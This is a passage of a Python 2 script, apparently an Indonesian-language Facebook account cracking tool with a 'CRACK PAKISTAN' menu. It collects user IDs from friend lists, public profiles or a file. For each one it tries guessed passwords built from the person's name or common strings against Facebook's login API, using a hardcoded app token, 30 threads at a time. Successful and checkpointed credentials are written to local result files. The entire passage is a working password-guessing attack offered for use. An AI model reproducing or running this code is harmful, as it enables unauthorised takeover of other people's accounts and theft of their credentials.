                            cekpoint.append(zowe)
                        else:
                            bos5 = j['first_name'] + '12345'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos5
                                oke = open('done/usa.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos5
                                cek = open('done/usa.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mSelesai ...'
    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mSalin hasil crack lalu simpan\x1b[1;91m : \x1b[1;97mdone usa.'
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    raw_input('\x1b[1;97m{\x1b[1;91mKembali\x1b[1;97m} ')
    os.system('python2 d4rk.py')


def crack_pakis():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;37m{\x1b[1;33m01\x1b[1;37m}\x1b[1;37m\x1b[1;37m Crack Dari Daftar Teman'
    print '\x1b[1;37m{\x1b[1;33m02\x1b[1;37m}\x1b[1;37m\x1b[1;37m Crack Dari Publik/Teman'
    print '\x1b[1;37m{\x1b[1;33m03\x1b[1;37m}\x1b[1;37m\x1b[1;37m Crack Dari File'
    print '\x1b[1;37m{\x1b[1;31m00\x1b[1;37m}\x1b[1;37m\x1b[1;37m Kembali'
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    pilih_pakis()


def pilih_pakis():
    teak = raw_input('\x1b[1;33mPilih \x1b[1;31m:\x1b[1;37m ')
    if teak == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Yg Benar Sayang !'
        pilih_pakis()
    elif teak == '1' or teak == '01':
        os.system('clear')
        print logo
        print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK PAKISTAN \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    elif teak == '2' or teak == '02':
        os.system('clear')
        print logo
        print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK PAKISTAN \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
        idt = raw_input('\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mID Target \x1b[1;91m:\x1b[1;97m ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mNama Akun \x1b[1;91m:\x1b[1;97m ' + op['name']
        except KeyError:
            print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID publik tidak ada !'
            raw_input('\n\x1b[1;97m[\x1b[1;91mKembali\x1b[1;97m]')
            crack_pakis()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi !'
            keluar()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

    else:
        if teak == '3' or teak == '03':
            os.system('clear')
            print logo
            try:
                print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK PAKISTAN \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mNama File\x1b[1;91m :\x1b[1;97m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada ! '
                raw_input('\n\x1b[1;97m{\x1b[1;91mKembali\x1b[1;97m}')
            except IOError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada !'
                raw_input('\n\x1b[1;97m{\x1b[1;91mKembali\x1b[1;97m}')
                crack_pakis()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Dengan Benar !'
            pilih_pakis()
        print '\x1b[0;97m{\x1b[0;91m\xc3\x97\x1b[0;97m} Total ID\x1b[1;91m  :\x1b[1;97m ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[0;97m{\x1b[0;91m\xc3\x97\x1b[0;97m} Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\x1b[1;97m\x1b[1;41;97m\nTidak Ada Hasil Gunakan Mode Pesawat 5 Detik\x1b[0m'
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'

    def main(arg):
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos1
                oke = open('done/pakis.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos1
                cek = open('done/pakis.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos2
                    oke = open('done/pakis.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos2
                    cek = open('done/pakis.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos3
                        oke = open('done/pakis.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos3
                        cek = open('done/pakis.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'pakistan'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos4
                            oke = open('done/pakis.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos4
                            cek = open('done/pakis.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = '786786'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos5
                                oke = open('done/pakis.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos5
                                cek = open('done/pakis.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['last_name'].lower() + '786'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos6
                                    oke = open('done/pakis.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos6
                                    cek = open('done/pakis.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos7
                                        oke = open('done/pakis.txt', 'a')
                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos7
                                        cek = open('done/pakis.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['last_name'].lower() + '1234'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos8
                                            oke = open('done/pakis.txt', 'a')
                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
